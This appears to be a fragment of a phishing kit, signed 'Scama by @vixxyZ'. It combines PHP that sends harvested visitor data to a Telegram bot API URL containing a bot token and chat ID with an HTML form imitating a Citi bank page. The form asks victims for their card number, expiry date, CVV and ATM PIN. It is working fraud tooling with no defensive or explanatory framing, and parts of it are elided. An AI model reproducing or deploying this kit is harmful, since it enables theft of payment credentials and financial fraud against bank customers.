...
$ua = $_SERVER['HTTP_USER_AGENT'];
        ...
        $mess    .= '#---------- Scama by @vixxyZ ----------------# '."\n";
                ...
                $url = "https://api.telegram.org/bot1999701536:AAGChvDDcdk6jCvYB4I8jXYkttJvxSfgXG0/sendmessage?chat_id=1861669283&text=".$msg;
...
<div class="row" style="font-weight: 600;color: #414042;margin-bottom: .75rem;">
   ...
   <?php 
    ...
    <div class="col-xs-12 col-sm-6"><div class="jpui header DATABOLD field-mb-12 field-mt-0" id="PERSONAL_NAME_HEADER">Please enter your card details</div></div></div>
       ...
       <label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel" class="text-input-label">Card Number</label>               
                      
                      <input type="text" name="cardnum" maxlength="16" value="" id="propCity" class="form-control" aria-required="true" data-validation="length" data-validation-error-msg="Hmm, we don’t recognize that card number. Double check it and try again." data-validation-length="min16" size="43" placeholder="Credit/Debit Card Number">       
                  </div>
                  ...
                  <div class="form-group col-sm-4 col-xs-12">
                      ...
                      <input type="text" name="cardexp" maxlength="25" value="" id="cardexp" class="form-control" aria-required="true" data-validation="length" data-validation-error-msg="Enter an expiration date." data-validation-length="min2" size="43" placeholder="__/__/____" im-insert="true">       
                  </div>
...
<div _ngcontent-tly-c277="" class="cvvImg"><citi-input _ngcontent-tly-c277="" id="hello" idstr="securityCode" name="securityCode" type="password" onpaste="event.preventDefault();" oncopy="event.preventDefault();" oncut="event.preventDefault();" class="citi-input row" _nghost-tly-c104=""><div _ngcontent-tly-c104="" class="col-xs-12 form-group"><label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel" class="text-input-label">CVV</label><div _ngcontent-tly-c104=""><div _ngcontent-tly-c104=""><div _ngcontent-tly-c104=""><!----><!----><!---->


<input _ngcontent-pig-c104="" aria-label="CVV" aria-labelledby="securityCodelabel" type="password" name="securityCode" id="securityCode" placeholder="CVV" maxlength="3" autocomplete="off" class="form-control ng-untouched ng-pristine ng-valid" data-order-appearance="0"  aria-required="true" data-validation="length" data-validation-error-msg="Enter your CVV." data-validation-length="min2" size="43" >

<!----><!----></div></div>


</div></div></citi-input><span _ngcontent-tly-c277="" class="cardArtImage"><img _ngcontent-tly-c277="" width="80" height="50" border="0" tabindex="0" src="assets/img/Register_Visa_Card.png" alt="For MasterCard and Visa, the Security Code (CVV) is the last 3 digits on the back of your card."></span></div>
                  
                 <div class="row">
                  <div class="form-group col-md-3 col-xs-12" style="margin-top: 7px;">
                      
                      <label _ngcontent-tly-c104="" for="securityCode" id="securityCodelabel" class="text-input-label">Atm Pin</label><input type="text" name="atmpin" value="" id="zip" class="form-control" aria-required="true" placeholder="Atm pin" data-validation="length" data-validation-error-msg=" " data-validation-length="min4-4" size="23">       
              </div>
 ...
 <citi-cta _ngcontent-ekd-c295="" type="primary" size="large" _nghost-ekd-c58="">
    ...
    </form></citi-form-container></main></citi-simple-layout></app-account-type></citi-simple-layout></ng-component></div>
</div>
